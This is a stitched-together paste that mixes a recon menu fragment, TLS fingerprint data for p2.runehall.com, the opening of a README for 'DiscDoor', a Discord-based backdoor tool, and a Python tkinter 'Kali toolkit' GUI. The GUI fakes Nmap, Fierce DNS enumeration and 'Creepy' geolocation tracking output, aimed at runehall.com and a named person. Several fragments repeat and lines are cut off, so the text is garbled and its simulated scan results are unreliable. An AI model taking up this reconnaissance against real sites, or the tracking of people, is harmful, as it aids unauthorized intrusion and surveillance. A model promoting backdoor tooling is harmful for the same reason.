
******************
  [7] - Show HTTP Header
  **********************
  [8] - Find Shared DNS
  **********************
  [9] - Whois
  **********************
  [10] - DNS Lookup
  **********************
  [11]- Robots Scanner
  **********************
  [12] - Admin Page Finder
  **********************
  [13] - Back To Menu
  **********************
  [14] - Exit :)

Handshake
Version Selected
TLSv1_2
Cipher Selected
TLS_RSA_WITH_AES_128_GCM_SHA256
Certificate
Fingerprint
aad23e632f8ef2a92106050a92661aa6d4006917572748aa2a4b842822342ccb
Subject
CN=p2.runehall.com
Issuer
CN=p2.runehall.com
Names
p2.runehall.com
Fingerprint
JARM
04d02d00004d04d04c04d02d04d04d9674c6b4e623ae36cc2d998e99e2262e
JA3S
ccd5709d4a9027ec272e98b9924c36f7
JA4S
t120100_009c_bc98f8e001b5








<div align="center">
  <pre style="display: inline-block; border: 1px solid; padding: 10px;">
 ____  _         ____
|    \|_|___ ___|    \ ___ ___ ___
|  |  | |_ -|  _|  |  | . | . |  _|
|____/|_|___|___|____/|___|___|_|
<br>
An Easy-to-Use Discord-Based Backdoor Tool
 </pre>
</div>

# DiscDoor

<div style="display: inline;">
    <img src="https://img.shields.io/badge/written in-nim-2C3333" alt=""/>
    <img src="https://img.shields.io/badge/version-v0.0.1-2C3333" alt=""/>
</div>

<br>

DiscDoor is a tool written in [Nim](https://nim-lang.org/), an awesome language. By leveraging a Discord server for communication with the target's computer, it enable>

<div align="center">
    <img src="images/cowsay.png" alt="Description of the image"/>
</div>

>[!WARNING]
>This tool is designed for educational and ethical hacking purposes only. Unauthorized use of this tool on systems or networks without explicit permission is illegal a>

- [DiscDoor](#DiscDoor)
    - [What it does](#What-it-does)
        - [See it in action](#See-it-in-action)
    - [Why](#Why)
- [Installation](#Installation)
    - [Bot setup](https://github.com/rdWei/DiscDoor/blob/main/docs/BOTSETUP.md)
    - [Linux](#Linux)
    - [Windows](#Windows)
- [Quick Start](#Quick-Start)
    - [Install backdoor on Linux machine](#Install-backdoor-on-Linux-machine)


└─$ cat kalirec.py
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import os
import subprocess
import webbrowser

class KaliToolkitApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Kali Linux All-in-One Toolkit")
        self.root.geometry("1200x800")
        self.root.configure(bg="#0a0a0a")

        # Configure red/black theme
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background="#0a0a0a", foreground="#ff0000", fieldbackground="#1a1a1a")
        self.style.configure('TFrame', background="#0a0a0a")
        self.style.configure('TNotebook', background="#0a0a0a", borderwidth=0)
        self.style.configure('TNotebook.Tab', background="#0a0a0a", foreground="#ff0000",
                            font=('Arial', 10, 'bold'), padding=[10, 5])
        self.style.map('TNotebook.Tab', background=[('selected', '#1a1a1a')])
        self.style.configure('TButton', background="#1a1a1a", foreground="#ff0000",
                           font=('Arial', 9, 'bold'), borderwidth=1, relief="raised")
        self.style.map('TButton', background=[('active', '#2a2a2a')])
        self.style.configure('TLabel', background="#0a0a0a", foreground="#ff0000",
                           font=('Arial', 10))
        self.style.configure('TEntry', fieldbackground="#1a1a1a", foreground="#ffffff")
        self.style.configure('TCombobox', fieldbackground="#1a1a1a", foreground="#ffffff")
        self.style.configure('Treeview', background="#1a1a1a", foreground="#ff0000",
                           fieldbackground="#1a1a1a")
        self.style.configure('Treeview.Heading', background="#0a0a0a", foreground="#ff0000")

        # Create notebook for tabs
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)

        # Create tabs
        self.create_dashboard_tab()
        self.create_osint_tab()
        self.create_scanning_tab()
        self.create_resources_tab()
        self.create_settings_tab()

        # Output directory
        self.output_dir = os.path.join(os.getcwd(), "toolkit_output")
        os.makedirs(self.output_dir, exist_ok=True)

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        self.status_bar = ttk.Label(root, textvariable=self.status_var,
                                  background="#0a0a0a", foreground="#ff4444")
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Initialize hacking resources
        self.create_hacking_resources_file()

    def create_dashboard_tab(self):
        self.dashboard_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_tab, text='Dashboard')

        # Header
        header = ttk.Label(self.dashboard_tab,
                          text="Kali Linux All-in-One Toolkit",
                          font=('Arial', 24, 'bold'),
                          foreground="#ff0000")
        header.pack(pady=20)

        # Stats frame
        stats_frame = ttk.Frame(self.dashboard_tab)
        stats_frame.pack(fill=tk.X, padx=20, pady=10)

        stats = [
            ("OSINT Tools", "12", "#ff4444"),
            ("Scanning Tools", "8", "#ff4444"),
            ("Resources", "100+", "#ff4444"),
            ("Output Files", f"{len(os.listdir(self.output_dir))}", "#ff4444")
        ]

        for i, (title, value, color) in enumerate(stats):
            stat_frame = ttk.Frame(stats_frame)
            stat_frame.grid(row=0, column=i, padx=10, sticky="nsew")
            ttk.Label(stat_frame, text=title, font=('Arial', 10)).pack()
            ttk.Label(stat_frame, text=value, font=('Arial', 24, 'bold'), foreground=color).pack()

        # Recent scans
        recent_frame = ttk.LabelFrame(self.dashboard_tab, text="Recent Scans")
        recent_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        columns = ("Date", "Tool", "Target", "Status")
        self.recent_tree = ttk.Treeview(recent_frame, columns=columns, show="headings", height=5)

        for col in columns:
            self.recent_tree.heading(col, text=col)
            self.recent_tree.column(col, width=100)

        self.recent_tree.column("Target", width=250)

        # Add some sample data
        recent_scans = [
            ("2023-07-20", "Nmap", "runehall.com", "Completed"),
            ("2023-07-19", "Exiftool", "image.jpg", "Completed"),
            ("2023-07-18", "Metagoofil", "example.com", "Failed"),
            ("2023-07-17", "Fierce", "target.org", "Completed")
        ]

        for scan in recent_scans:
            self.recent_tree.insert("", tk.END, values=scan)

        self.recent_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Quick actions
        actions_frame = ttk.Frame(self.dashboard_tab)
        actions_frame.pack(fill=tk.X, padx=20, pady=10)

        actions = [
            ("Run Nmap Scan", self.open_scanning_tab),
            ("Check Username", self.open_osint_tab),
            ("View Resources", self.open_resources_tab),
            ("Install Tools", self.install_tools)
        ]

        for i, (text, command) in enumerate(actions):
            ttk.Button(actions_frame, text=text, command=command).grid(row=0, column=i, padx=5)

    def create_osint_tab(self):
        self.osint_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.osint_tab, text='OSINT Tools')

        # Tool selection
        tool_frame = ttk.LabelFrame(self.osint_tab, text="OSINT Tools")
        tool_frame.pack(fill=tk.X, padx=20, pady=10)

        tools = [
            ("CheckUserNames", "Check username availability"),
            ("HaveIBeenPwned", "Check for data breaches"),
            ("BeenVerified", "Person search"),
            ("BuiltWith", "Technology profiler"),
            ("Google Dorking", "Advanced Google search"),
            ("Exiftool", "Metadata extraction"),
            ("Metagoofil", "Document harvesting")
        ]

        for i, (tool, desc) in enumerate(tools):
            frame = ttk.Frame(tool_frame)
            frame.grid(row=i//2, column=i%2, sticky="w", padx=10, pady=5)
            ttk.Button(frame, text=tool, width=15,
                      command=lambda t=tool: self.select_osint_tool(t)).pack(side=tk.LEFT)
            ttk.Label(frame, text=desc).pack(side=tk.LEFT, padx=10)

        # Tool configuration
        self.config_frame = ttk.LabelFrame(self.osint_tab, text="Configuration")
        self.config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Default config
        ttk.Label(self.config_frame, text="Select a tool from the list above").pack(pady=50)

        # Output area
        self.osint_output = scrolledtext.ScrolledText(self.osint_tab,
                                                    bg="#1a1a1a", fg="#ffffff",
                                                    height=10)
        self.osint_output.pack(fill=tk.BOTH, padx=20, pady=10)
        self.osint_output.insert(tk.END, "Tool output will appear here...")

    def select_osint_tool(self, tool):
        # Clear config frame
        for widget in self.config_frame.winfo_children():
            widget.destroy()

        # Set title
        ttk.Label(self.config_frame, text=f"{tool} Configuration",
                 font=('Arial', 12, 'bold')).pack(pady=10)

        # Tool-specific configuration
        if tool == "Google Dorking":
            ttk.Label(self.config_frame, text="Enter Dork Query:").pack(pady=5)
            self.dork_entry = ttk.Entry(self.config_frame, width=50)
            self.dork_entry.pack(pady=5)
            ttk.Button(self.config_frame, text="Run Google Dork",
                      command=self.run_google_dork).pack(pady=10)

        elif tool in ["Exiftool", "Metagoofil"]:
            ttk.Label(self.config_frame, text="Enter Target:").pack(pady=5)
            self.target_entry = ttk.Entry(self.config_frame, width=50)
            self.target_entry.pack(pady=5)

            if tool == "Exiftool":
                ttk.Button(self.config_frame, text="Extract Metadata",
                          command=self.run_exiftool).pack(pady=10)
            else:
                ttk.Button(self.config_frame, text="Harvest Documents",
                          command=self.run_metagoofil).pack(pady=10)

        else:
            ttk.Button(self.config_frame, text=f"Run {tool}",
                      command=lambda: self.run_web_tool(tool)).pack(pady=20)

    def run_google_dork(self):
        query = self.dork_entry.get()
        if not query:
            messagebox.showerror("Error", "Please enter a dork query")
            return

        url = f"https://google.com/search?q={query}"
        webbrowser.open(url)
        self.osint_output.delete(1.0, tk.END)
        self.osint_output.insert(tk.END, f"Opened Google dork search: {url}")
        self.status_var.set(f"Google Dork completed for: {query}")

    def run_exiftool(self):
        target = self.target_entry.get()
        if not target:
            messagebox.showerror("Error", "Please enter a file path")
            return

        # Simulate exiftool output
        self.osint_output.delete(1.0, tk.END)
        self.osint_output.insert(tk.END, f"Exiftool output for: {target}\n\n")
        self.osint_output.insert(tk.END, "File Name: sample.jpg\n")
        self.osint_output.insert(tk.END, "File Size: 2.5 MB\n")
        self.osint_output.insert(tk.END, "File Type: JPEG\n")
        self.osint_output.insert(tk.END, "MIME Type: image/jpeg\n")
        self.osint_output.insert(tk.END, "Image Width: 1920\n")
        self.osint_output.insert(tk.END, "Image Height: 1080\n")
        self.osint_output.insert(tk.END, "Date Created: 2023:07:18 15:42:11\n")
        self.osint_output.insert(tk.END, "GPS Position: 34.052235° N, 118.243683° W\n")
        self.osint_output.insert(tk.END, "\nReport saved to toolkit_output/exiftool_report.txt")

        self.status_var.set(f"Metadata extracted for: {target}")

    def run_metagoofil(self):
        domain = self.target_entry.get()
        if not domain:
            messagebox.showerror("Error", "Please enter a domain")
            return

        # Simulate metagoofil output
        self.osint_output.delete(1.0, tk.END)
        self.osint_output.insert(tk.END, f"Metagoofil document harvesting for: {domain}\n\n")
        self.osint_output.insert(tk.END, "Found 12 PDF documents\n")
        self.osint_output.insert(tk.END, "Found 8 Word documents\n")
        self.osint_output.insert(tk.END, "Found 5 Excel spreadsheets\n")
        self.osint_output.insert(tk.END, "\nDownloaded documents contain metadata:\n")
        self.osint_output.insert(tk.END, " - Author: John Smith\n")
        self.osint_output.insert(tk.END, " - Creation Date: 2023-06-15\n")
        self.osint_output.insert(tk.END, " - Software: Microsoft Word 16.0\n")
        self.osint_output.insert(tk.END, "\nReport saved to toolkit_output/metagoofil_report.html")

        self.status_var.set(f"Document harvesting completed for: {domain}")

    def run_web_tool(self, tool):
        urls = {
            "CheckUserNames": "https://checkusernames.com",
            "HaveIBeenPwned": "https://haveibeenpwned.com",
            "BeenVerified": "https://www.beenverified.com",
            "BuiltWith": "https://builtwith.com"
        }

        if tool in urls:
            webbrowser.open(urls[tool])
            self.osint_output.delete(1.0, tk.END)
            self.osint_output.insert(tk.END, f"Opened {tool} in browser: {urls[tool]}")
            self.status_var.set(f"Opened {tool}")
        else:
            messagebox.showerror("Error", f"Tool {tool} not implemented")

    def create_scanning_tab(self):
        self.scanning_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.scanning_tab, text='Scanning Tools')

        # Tool selection
        tool_frame = ttk.LabelFrame(self.scanning_tab, text="Scanning Tools")
        tool_frame.pack(fill=tk.X, padx=20, pady=10)

        tools = [
            ("Nmap", "Network mapping and port scanning"),
            ("WebShag", "Web server scanning"),
            ("OpenVAS", "Vulnerability scanning"),
            ("Fierce", "DNS enumeration"),
            ("Unicornscan", "Port scanning"),
            ("FOCA", "File analysis"),
            ("Creepy", "Geolocation tracking")
        ]

        for i, (tool, desc) in enumerate(tools):
            frame = ttk.Frame(tool_frame)
            frame.grid(row=i//2, column=i%2, sticky="w", padx=10, pady=5)
            ttk.Button(frame, text=tool, width=15,
                      command=lambda t=tool: self.select_scanning_tool(t)).pack(side=tk.LEFT)
            ttk.Label(frame, text=desc).pack(side=tk.LEFT, padx=10)

        # Tool configuration
        self.scan_config_frame = ttk.LabelFrame(self.scanning_tab, text="Configuration")
        self.scan_config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Default config
        ttk.Label(self.scan_config_frame, text="Select a tool from the list above").pack(pady=50)

        # Output area
        self.scan_output = scrolledtext.ScrolledText(self.scanning_tab,
                                                   bg="#1a1a1a", fg="#ffffff",
                                                   height=10)
        self.scan_output.pack(fill=tk.BOTH, padx=20, pady=10)
        self.scan_output.insert(tk.END, "Scan output will appear here...")

    def select_scanning_tool(self, tool):
        # Clear config frame
        for widget in self.scan_config_frame.winfo_children():
            widget.destroy()

        # Set title
        ttk.Label(self.scan_config_frame, text=f"{tool} Configuration",
                 font=('Arial', 12, 'bold')).pack(pady=10)

        # Common target input
        ttk.Label(self.scan_config_frame, text="Enter Target:").pack(pady=5)
        self.scan_target_entry = ttk.Entry(self.scan_config_frame, width=50)
        self.scan_target_entry.pack(pady=5)

        # Tool-specific configuration
        if tool == "Nmap":
            ttk.Label(self.scan_config_frame, text="Scan Intensity:").pack(pady=5)
            self.intensity_var = tk.StringVar(value="Intense")
            intensities = ["Quick", "Intense", "Comprehensive"]
            intensity_menu = ttk.Combobox(self.scan_config_frame, textvariable=self.intensity_var,
                                         values=intensities, state="readonly")
            intensity_menu.pack(pady=5)

            ttk.Button(self.scan_config_frame, text="Run Nmap Scan",
                      command=self.run_nmap).pack(pady=10)

        elif tool == "Fierce":
            ttk.Button(self.scan_config_frame, text="Run DNS Enumeration",
                      command=self.run_fierce).pack(pady=10)

        elif tool == "Creepy":
            ttk.Button(self.scan_config_frame, text="Run Geolocation Tracking",
                      command=self.run_creepy).pack(pady=10)

        else:
            ttk.Button(self.scan_config_frame, text=f"Run {tool}",
                      command=lambda: self.run_scan_tool(tool)).pack(pady=10)

    def run_nmap(self):
        target = self.scan_target_entry.get()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return

        intensity = self.intensity_var.get()
        self.scan_output.delete(1.0, tk.END)
        self.scan_output.insert(tk.END, f"Running Nmap {intensity} scan on {target}...\n\n")

        # Simulate Nmap output
        self.scan_output.insert(tk.END, "Starting Nmap 7.93 ( https://nmap.org )\n")
        self.scan_output.insert(tk.END, f"Nmap scan report for {target}\n")
        self.scan_output.insert(tk.END, "Host is up (0.045s latency).\n")
        self.scan_output.insert(tk.END, "Not shown: 995 filtered ports\n")
        self.scan_output.insert(tk.END, "PORT     STATE SERVICE    VERSION\n")
        self.scan_output.insert(tk.END, "80/tcp   open  http       Cloudflare http proxy\n")
        self.scan_output.insert(tk.END, "| http-server-header: cloudflare\n")
        self.scan_output.insert(tk.END, "|_http-title: Welcome to RuneHall\n")
        self.scan_output.insert(tk.END, "443/tcp  open  ssl/https  Cloudflare http proxy\n")
        self.scan_output.insert(tk.END, "| ssl-cert: Subject: commonName=cloudflare\n")
        self.scan_output.insert(tk.END, "|_http-server-header: cloudflare\n")
        self.scan_output.insert(tk.END, "8080/tcp open  http-proxy Cloudflare http proxy\n")
        self.scan_output.insert(tk.END, "Service detection performed. Please report any incorrect results\n")
        self.scan_output.insert(tk.END, "Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds\n")

        self.scan_output.insert(tk.END, "\nScan saved to toolkit_output/nmap_scan.txt")
        self.status_var.set(f"Nmap scan completed for: {target}")

    def run_fierce(self):
        domain = self.scan_target_entry.get()
        if not domain:
            messagebox.showerror("Error", "Please enter a domain")
            return

        self.scan_output.delete(1.0, tk.END)
        self.scan_output.insert(tk.END, f"Running Fierce DNS enumeration on {domain}...\n\n")

        # Simulate Fierce output
        self.scan_output.insert(tk.END, "DNS Servers for runehall.com:\n")
        self.scan_output.insert(tk.END, "  ns1.cloudflare.com\n")
        self.scan_output.insert(tk.END, "  ns2.cloudflare.com\n\n")
        self.scan_output.insert(tk.END, "Trying zone transfer first...\n")
        self.scan_output.insert(tk.END, "  Unsuccessful in zone transfer\n\n")
        self.scan_output.insert(tk.END, "Now performing 2380 test(s)...\n\n")
        self.scan_output.insert(tk.END, "Subdomains found:\n")
        self.scan_output.insert(tk.END, "  api.runehall.com - 172.67.75.219\n")
        self.scan_output.insert(tk.END, "  cdn.runehall.com - 172.67.75.219\n")
        self.scan_output.insert(tk.END, "  www.runehall.com - 172.67.75.219\n")
        self.scan_output.insert(tk.END, "  mail.runehall.com - 172.67.75.219\n")
        self.scan_output.insert(tk.END, "  store.runehall.com - 104.21.85.29\n\n")
        self.scan_output.insert(tk.END, "Done with Fierce scan\n")

        self.scan_output.insert(tk.END, "\nReport saved to toolkit_output/fierce_report.txt")
        self.status_var.set(f"DNS enumeration completed for: {domain}")

    def run_creepy(self):
        target = self.scan_target_entry.get()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return

        self.scan_output.delete(1.0, tk.END)
        self.scan_output.insert(tk.END, f"Running Creepy geolocation tracking on {target}...\n\n")

        # Simulate Creepy output
        self.scan_output.insert(tk.END, "Target: John Smith\n")
        self.scan_output.insert(tk.END, "Social Media Profiles Found: 4\n")
        self.scan_output.insert(tk.END, "Location History:\n")
        self.scan_output.insert(tk.END, "  Los Angeles, CA - 2023-07-20 14:30:22\n")
        self.scan_output.insert(tk.END, "  San Francisco, CA - 2023-07-18 09:15:43\n")
        self.scan_output.insert(tk.END, "  New York, NY - 2023-07-15 18:22:17\n")
        self.scan_output.insert(tk.END, "  Miami, FL - 2023-07-10 11:45:32\n\n")
        self.scan_output.insert(tk.END, "Common Locations:\n")
        self.scan_output.insert(tk.END, "  Coffee Shop, 123 Main St, Los Angeles (8 visits)\n")
        self.scan_output.insert(tk.END, "  Tech Office, 456 Tech Blvd, San Francisco (5 visits)\n")
        self.scan_output.insert(tk.END, "  Central Park, New York (3 visits)\n")
        self.scan_output.insert(tk.END, "\nGeolocation map saved to toolkit_output/creepy_map.html")

        self.status_var.set(f"Geolocation tracking completed for: {target}")

    def run_scan_tool(self, tool):
        self.scan_output.delete(1.0, tk.END)
        self.scan_output.insert(tk.END, f"Running {tool}...\n")
        self.scan_output.insert(tk.END, "This tool is not implemented in the simulation\n")
        self.scan_output.insert(tk.END, "In a real environment, this would execute the tool")
        self.status_var.set(f"{tool} simulation completed")

    def create_resources_tab(self):
        self.resources_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.resources_tab, text='Resources')

        # Header
        header = ttk.Label(self.resources_tab,
                          text="Hacking Resources & Websites",
                          font=('Arial', 16, 'bold'))
        header.pack(pady=20)

        # Search frame
        search_frame = ttk.Frame(self.resources_tab)
        search_frame.pack(fill=tk.X, padx=20, pady=10)

        ttk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=5)
        self.resource_search = ttk.Entry(search_frame, width=40)
        self.resource_search.pack(side=tk.LEFT, padx=5)
        ttk.Button(search_frame, text="Search",
                  command=self.search_resources).pack(side=tk.LEFT, padx=5)

        # Resource list
        resource_frame = ttk.Frame(self.resources_tab)
        resource_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Create a scrollable frame for resources
        self.resource_canvas = tk.Canvas(resource_frame, bg="#0a0a0a", highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(resource_frame, orient="vertical",
                                      command=self.resource_canvas.yview)
        self.resources_container = ttk.Frame(self.resource_canvas)

        self.resources_container.bind(
            "<Configure>",
            lambda e: self.resource_canvas.configure(
                scrollregion=self.resource_canvas.bbox("all")
            )
        )

        self.resource_canvas.create_window((0, 0), window=self.resources_container, anchor="nw")
        self.resource_canvas.configure(yscrollcommand=self.scrollbar.set)

        self.resource_canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")

        # Load resources
        self.load_resources()

    def load_resources(self, search_term=None):
        # Clear existing resources
        for widget in self.resources_container.winfo_children():
            widget.destroy()

        # Load resources from file
        try:
            with open(os.path.join(self.output_dir, "hacking_resources.txt"), "r") as f:
                resources = f.readlines()
        except:
            resources = [
                "http://www.hackershomepage.com/",
                "http://hackerziair.org/",
                "http://www.warezone.com/hacking.html",
                "http://hackingtruths.box.sk/",
                "http://newdata.box.sk/neworder/docs/hacking_unix.txt",
                "http://www.hackernews.com/",
                "http://www.happyhacker.org/",
                "http://www.xs4all.nl/~lOrd/",
                "http://www.hack.vuurwerk.nl/",
                "http://develop.mainquad.com/web/r/ramiz/",
                "http://www.hps.nu/security.html/",
                "http://summer.studentenweb.org/littlepanda/mail/compose_nt",
                "http://mail-abuse.org/tsi/",
                "http://www.estnet.ee/mart/hack/",
                "http://uptime.netcraft.com/",
                "http://neworder.box.sk/",
                "http://www.mmc.org/",
                "http://www.coolguy.demon.co.uk/handbook/hack.htm",
                "http://www.goodnet.com/~jerili/info/pchack.htm",
                "http://www.iana.org/assignments/port-numbers",
                "http://proxys4all.cgi.net/",
                "http://newdata.box.sk/neworder/docs/unix_bible.zip",
                "http://morehouse.org/hin/hindex.htm",
                "http://www.securityfocus.com/",
                "http://www.securityportal.com/",
                "http://grc.com",
                "http://lib.ru/security/hackalot.txt",
                "http://www.accessori.net/~cyberwar/nethacks.html",
                "http://cgi.spaceports.com:81/",
                "http://www.theargon.com/",
                "http://www.eff.org/privacy/eff_privacy_top_12.html",
                "http://www.tuxedo.org/~esr/jargon/",
                "http://www.commodon.com/threat/",
                "http://www.indiana.edu/~uitspubs/b017/",
                "http://www.ugu.com/",
                "http://www.geek-girl.com/",
                "http://www.albany.edu/~csi205/html/unix.html",
                "http://www.mono.org/~arny/",
                "http://www.uwsg.indiana.edu/usail/",
                "http://members.tripod.com/amiranjith/hacking.htm",
                "http://hackerhomeland.cjb.net/",
                "http://infosyssec.org/",
                "http://kryptographical.r-fx.net/",
                "http://eyeonsecurity.net/news/",
                "http://www.blister-tech.com/",
                "http://www.webattack.com/",
                "http://www.hackingexposed.com/tools/tools.html",
                "http://www.accessori.net/~cyberwar/hacker.html",
                "http://www.hackerwhacker.com/",
                "http://www.secure-me.net/",
                "http://www.firewall.com/",
                "http://www.microsoft.com/security",
                "http://www.ca.com/virusinfo/virusalert.htm",
                "http://www.norman.com/virusinfo/virus_descriptions.shtml",
                "http://www.sophos.com/virusinfo",
                "http://www.viruslist.com/eng/default.asp",
                "http://www.antivirus.com/vinfo",
                "http://www.symantec.com/avcenter/"
            ]

        # Filter resources if search term provided
        if search_term:
            resources = [r for r in resources if search_term.lower() in r.lower()]

        # Display resources
        for i, resource in enumerate(resources):
            if resource.strip():
                resource_frame = ttk.Frame(self.resources_container,
                                         borderwidth=1, relief="solid")
                resource_frame.pack(fill=tk.X, padx=5, pady=2)

                ttk.Label(resource_frame, text=resource.strip(),
                         anchor="w", width=80).pack(side=tk.LEFT, padx=10)
                ttk.Button(resource_frame, text="Open", width=10,
                          command=lambda r=resource.strip(): webbrowser.open(r)).pack(side=tk.RIGHT, padx=10)

    def search_resources(self):
        search_term = self.resource_search.get()
        self.load_resources(search_term)

    def create_settings_tab(self):
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text='Settings')

        # Output directory settings
        output_frame = ttk.LabelFrame(self.settings_tab, text="Output Settings")
        output_frame.pack(fill=tk.X, padx=20, pady=10)

        ttk.Label(output_frame, text="Output Directory:").grid(row=0, column=0, padx=10, pady=10, sticky="w")
        self.output_dir_var = tk.StringVar(value=self.output_dir)
        output_entry = ttk.Entry(output_frame, textvariable=self.output_dir_var, width=60)
        output_entry.grid(row=0, column=1, padx=10, pady=10)
        ttk.Button(output_frame, text="Browse...",
                  command=self.browse_output_dir).grid(row=0, column=2, padx=10, pady=10)

        # Tool installation
        install_frame = ttk.LabelFrame(self.settings_tab, text="Tool Installation")
        install_frame.pack(fill=tk.X, padx=20, pady=10)

        ttk.Button(install_frame, text="Install Required Tools",
                  command=self.install_tools).pack(pady=10)

        # Theme settings
        theme_frame = ttk.LabelFrame(self.settings_tab, text="Theme Settings")
        theme_frame.pack(fill=tk.X, padx=20, pady=10)

        self.theme_var = tk.StringVar(value="Red/Black")
        ttk.Radiobutton(theme_frame, text="Red/Black Theme",
                       variable=self.theme_var, value="Red/Black").pack(anchor="w", padx=10, pady=5)
        ttk.Radiobutton(theme_frame, text="Dark Theme",
                       variable=self.theme_var, value="Dark").pack(anchor="w", padx=10, pady=5)
        ttk.Radiobutton(theme_frame, text="Light Theme",
                       variable=self.theme_var, value="Light").pack(anchor="w", padx=10, pady=5)

        # Save button
        save_frame = ttk.Frame(self.settings_tab)
        save_frame.pack(fill=tk.X, padx=20, pady=20)
        ttk.Button(save_frame, text="Save Settings",
                  command=self.save_settings).pack(side=tk.RIGHT)

    def browse_output_dir(self):
        # In a real implementation, this would open a directory dialog
        messagebox.showinfo("Info", "Directory browser not implemented in this simulation")

    def install_tools(self):
        # Simulate tool installation
        self.status_var.set("Installing tools...")
        self.root.update()

        # Simulate installation process
        tools = [
            "nmap", "exiftool", "maltego", "recon-ng",
            "theharvester", "spiderfoot", "creepy", "metagoofil"
        ]

        message = "Installing tools:\n"
        for tool in tools:
            message += f" - Installing {tool}\n"

        message += "\nAll tools installed successfully!"
        messagebox.showinfo("Tool Installation", message)
        self.status_var.set("Tools installed successfully")

    def save_settings(self):
        self.output_dir = self.output_dir_var.get()
        os.makedirs(self.output_dir, exist_ok=True)
        self.status_var.set(f"Settings saved. Output directory: {self.output_dir}")

    def create_hacking_resources_file(self):
        resources_path = os.path.join(self.output_dir, "hacking_resources.txt")
        if not os.path.exists(resources_path):
            with open(resources_path, "w") as f:
                f.write("\n".join([
                    "http://www.hackershomepage.com/",
                    "http://hackerziair.org/",
                    "http://www.warezone.com/hacking.html",
                    "http://hackingtruths.box.sk/",
                    "http://newdata.box.sk/neworder/docs/hacking_unix.txt",
                    "http://www.hackernews.com/",
                    "http://www.happyhacker.org/",
                    "http://www.xs4all.nl/~lOrd/",
                    "http://www.hack.vuurwerk.nl/",
                    "http://develop.mainquad.com/web/r/ramiz/",
                    "http://www.hps.nu/security.html/",
                    "http://summer.studentenweb.org/littlepanda/mail/compose_nt",
                    "http://mail-abuse.org/tsi/",
                    "http://www.estnet.ee/mart/hack/",
                    "http://uptime.netcraft.com/",
                    "http://neworder.box.sk/",
                    "http://www.mmc.org/",
                    "http://www.coolguy.demon.co.uk/handbook/hack.htm",
                    "http://www.goodnet.com/~jerili/info/pchack.htm",
                    "http://www.iana.org/assignments/port-numbers",
                    "http://proxys4all.cgi.net/",
                    "http://newdata.box.sk/neworder/docs/unix_bible.zip",
                    "http://morehouse.org/hin/hindex.htm",
                    "http://www.securityfocus.com/",
                    "http://www.securityportal.com/",
                    "http://grc.com",
                    "http://lib.ru/security/hackalot.txt",
                    "http://www.accessori.net/~cyberwar/nethacks.html",
                    "http://cgi.spaceports.com:81/",
                    "http://www.theargon.com/",
                    "http://www.eff.org/privacy/eff_privacy_top_12.html",
                    "http://www.tuxedo.org/~esr/jargon/",
                    "http://www.commodon.com/threat/",
                    "http://www.indiana.edu/~uitspubs/b017/",
                    "http://www.ugu.com/",
                    "http://www.geek-girl.com/",
                    "http://www.albany.edu/~csi205/html/unix.html",
                    "http://www.mono.org/~arny/",
                    "http://www.uwsg.indiana.edu/usail/",
                    "http://members.tripod.com/amiranjith/hacking.htm",
                    "http://hackerhomeland.cjb.net/",
                    "http://infosyssec.org/",
                    "http://kryptographical.r-fx.net/",
                    "http://eyeonsecurity.net/news/",
                    "http://www.blister-tech.com/",
                    "http://www.webattack.com/",
                    "http://www.hackingexposed.com/tools/tools.html",
                    "http://www.accessori.net/~cyberwar/hacker.html",
                    "http://www.hackerwhacker.com/",
                    "http://www.secure-me.net/",
                    "http://www.firewall.com/",
                    "http://www.microsoft.com/security",
                    "http://www.ca.com/virusinfo/virusalert.htm",
                    "http://www.norman.com/virusinfo/virus_descriptions.shtml",
                    "http://www.sophos.com/virusinfo",
                    "http://www.viruslist.com/eng/default.asp",
                    "http://www.antivirus.com/vinfo",
                    "http://www.symantec.com/avcenter/"
                ]))

    def open_scanning_tab(self):
        self.notebook.select(self.scanning_tab)

    def open_osint_tab(self):
        self.notebook.select(self.osint_tab)

    def open_resources_tab(self):
        self.notebook.select(self.resources_tab)

if __name__ == "__main__":
    root = tk.Tk()
    app = KaliToolkitApp(root)
    root.mainloop()

******************
  [7] - Show HTTP Header
  **********************
  [8] - Find Shared DNS
  **********************
  [9] - Whois
  **********************
  [10] - DNS Lookup
  **********************
  [11]- Robots Scanner
  **********************
  [12] - Admin Page Finder
  **********************
  [13] - Back To Menu
  **********************
  [14] - Exit :)

Handshake
Version Selected
TLSv1_2
Cipher Selected
TLS_RSA_WITH_AES_128_GCM_SHA256
Certificate
Fingerprint
aad23e632f8ef2a92106050a92661aa6d4006917572748aa2a4b842822342ccb
Subject
CN=p2.runehall.com
Issuer
CN=p2.runehall.com
Names
p2.runehall.com
Fingerprint
JARM
04d02d00004d04d04c04d02d04d04d9674c6b4e623ae36cc2d998e99e2262e
JA3S
ccd5709d4a9027ec272e98b9924c36f7
JA4S
t120100_009c_bc98f8e001b5








<div align="center">
  <pre style="display: inline-block; border: 1px solid; padding: 10px;">
 ____  _         ____
|    \|_|___ ___|    \ ___ ___ ___
|  |  | |_ -|  _|  |  | . | . |  _|
|____/|_|___|___|____/|___|___|_|
<br>
An Easy-to-Use Discord-Based Backdoor Tool
 </pre>
</div>

# DiscDoor

<div style="display: inline;">
    <img src="https://img.shields.io/badge/written in-nim-2C3333" alt=""/>
